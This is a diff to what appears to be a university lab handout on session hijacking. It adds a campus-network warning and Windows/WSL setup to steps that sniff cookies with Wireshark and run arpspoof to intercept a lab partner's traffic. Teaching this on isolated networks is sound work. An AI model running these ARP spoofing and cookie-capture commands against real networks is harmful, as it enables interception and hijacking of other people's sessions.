@@ -12,6 +12,18 @@ No remediation this week. The goal is to viscerally understand why encryption in
 
 ---
 
+## ⚠️ Network and Acceptable Use Policy Warning
+
+**Do NOT perform the ARP spoofing portion of this lab (Steps 6–11) on the UW campus network or any school-provided wifi.**
+
+ARP spoofing poisons ARP caches across your entire network subnet — not just between you and your lab partner. On a shared school network this affects other users' traffic and constitutes unauthorized interference with a computer network, which violates the UW Acceptable Use Policy and may violate the Computer Fraud and Abuse Act (18 U.S.C. § 1030).
+
+**Required setup for Steps 6–11:** Both you and your lab partner must be connected to an **isolated local network** — a personal mobile hotspot, a home router, or a dedicated lab switch. The key requirement is that no other people are on the same network segment during the exercise.
+
+Steps 1–5 (Wireshark on your own localhost traffic) are safe to perform anywhere.
+
+---
+
 ## Tools
 
 | Tool | Purpose |
@@ -19,17 +31,37 @@ No remediation this week. The goal is to viscerally understand why encryption in
 | Wireshark | Packet capture and traffic analysis |
 | arpspoof (dsniff package) | ARP spoofing to position yourself as a MITM |
 | Terminal | Execute commands |
-| ip / ifconfig | Identify network interfaces and IP addresses |
+| ip / ifconfig / ipconfig | Identify network interfaces and IP addresses |
 | Browser Developer Tools | Manually set cookies |
 
-**Installing dsniff:**
-```bash
-# Linux
-sudo apt install dsniff
+### Installing Tools by Platform
 
-# macOS
-brew install dsniff
+**macOS:**
+```bash
+brew install wireshark dsniff
 ```
+> If `brew` is not installed, run the one-liner at [brew.sh](https://brew.sh) first.
+
+**Linux (Debian/Ubuntu):**
+```bash
+sudo apt update && sudo apt install wireshark dsniff
+```
+> During Wireshark install, select **Yes** when asked whether non-root users may capture packets.
+
+**Windows:**
+- Download Wireshark from [wireshark.org/download](https://www.wireshark.org/download.html) and install normally.
+- `arpspoof` (from the dsniff package) does not have an official Windows build. Windows users must use **WSL 2** (Windows Subsystem for Linux) to run arpspoof.
+
+**Installing WSL 2 on Windows (required for arpspoof):**
+```powershell
+# Run in PowerShell as Administrator
+wsl --install
+# Restart your machine, then open the Ubuntu app that was installed
+# Inside WSL:
+sudo apt update && sudo apt install dsniff
+```
+
+> All `arpspoof` and `sysctl` commands in this lab must be run inside WSL on Windows. Wireshark itself runs natively in Windows.
 
 ---
 
@@ -37,19 +69,33 @@ brew install dsniff
 
 ### 1. Identify Your Network Interface
 
+**macOS / Linux:**
 ```bash
-ip addr      # Linux
-ifconfig     # macOS
-ipconfig     # Windows
+ifconfig        # macOS
+ip addr         # Linux
 ```
 
-Record your IP address and the name of the active interface (e.g., `eth0`, `en0`, `wlan0`).
+**Windows (PowerShell):**
+```powershell
+ipconfig
+```
+
+**Windows (WSL):**
+```bash
+ip addr
+```
+
+Record your IP address and the name of the active interface (e.g., `eth0`, `en0`, `wlan0`, or `Wi-Fi`).
 
 ---
 
 ### 2. Start a Wireshark Capture
 
 Open Wireshark. Select your active network interface. Start capturing (the blue shark fin button) **before** you log in.
+
+> **macOS note:** If no interfaces appear, open System Preferences → Privacy & Security → and grant Wireshark permission to capture packets, then relaunch.
+
+> **Windows note:** Select the interface named **Loopback: lo** or **Npcap Loopback Adapter** to capture localhost traffic.
 
 ---
 
@@ -83,33 +129,58 @@ Locate a request that contains your session cookie. Record the full cookie name 
 
 ### 6. Partner Setup (MITM Exercise)
 
-Pair with a lab partner. Designate one person as the **victim** (logged into HuskyHub on their machine) and one as the **attacker**. Both machines must be on the same local network.
+> **Reminder:** Both machines must be on an isolated personal network — not school wifi. See the warning at the top of this lab.
+
+Pair with a lab partner. Designate one person as the **victim** (logged into HuskyHub on their machine) and one as the **attacker**. Connect both machines to the same personal hotspot or home router.
 
 Record the victim's IP address and the network gateway IP:
+
+**macOS:**
 ```bash
-ip route    # Linux — look for "default via <gateway>"
-netstat -rn # macOS
+netstat -rn | grep default
+```
+
+**Linux:**
+```bash
+ip route    # look for "default via <gateway>"
+```
+
+**Windows (PowerShell):**
+```powershell
+Get-NetRoute -DestinationPrefix "0.0.0.0/0"
+```
+
+**Windows (WSL):**
+```bash
+ip route
 ```
 
 ---
 
 ### 7. Enable IP Forwarding on the Attacker Machine
 
-This ensures traffic continues to flow so the victim does not lose connectivity during the attack:
+This ensures traffic continues to flow so the victim does not lose connectivity during the attack.
 
+**macOS:**
 ```bash
-# Linux
-sudo sysctl -w net.ipv4.ip_forward=1
-
-# macOS
 sudo sysctl -w net.inet.ip.forwarding=1
+```
+
+**Linux:**
+```bash
+sudo sysctl -w net.ipv4.ip_forward=1
+```
+
+**Windows (WSL):**
+```bash
+sudo sysctl -w net.ipv4.ip_forward=1
 ```
 
 ---
 
 ### 8. Execute the ARP Spoofing Attack
 
-Open two terminals on the attacker machine and run both commands simultaneously:
+Open two terminals (or two WSL windows on Windows) on the attacker machine and run both commands simultaneously:
 
 ```bash
 # Terminal 1: Tell the victim that you are the gateway
@@ -119,11 +190,15 @@ sudo arpspoof -i <interface> -t <victim-ip> <gateway-ip>
 sudo arpspoof -i <interface> -t <gateway-ip> <victim-ip>
 ```
 
+> **macOS note:** The interface will typically be `en0` (Wi-Fi) or `en1`. Confirm with `ifconfig`.
+
+> **Windows (WSL) note:** The interface inside WSL will typically be `eth0`. Confirm with `ip addr` inside WSL.
+
 ---
 
 ### 9. Capture the Victim's Session Cookie
 
-While both arpspoof processes are running, start a Wireshark capture on the attacker machine filtered to the victim's IP:
+While both arpspoof processes are running, start a Wireshark capture on the **attacker machine** (using the native Wireshark application on macOS or Windows) filtered to the victim's IP:
 ```
 ip.addr == <victim-ip> && http.cookie
 ```
@@ -145,6 +220,18 @@ Reload `http://localhost`. Document what you can now access.
 ### 11. Restore the Network
 
 Stop both arpspoof processes (`Ctrl+C`). ARP caches will repair themselves within a minute. Confirm your partner's HuskyHub session is unaffected.
+
+Disable IP forwarding:
+
+**macOS:**
+```bash
+sudo sysctl -w net.inet.ip.forwarding=0
+```
+
+**Linux / WSL:**
+```bash
+sudo sysctl -w net.ipv4.ip_forward=0
+```
 
 ---
 
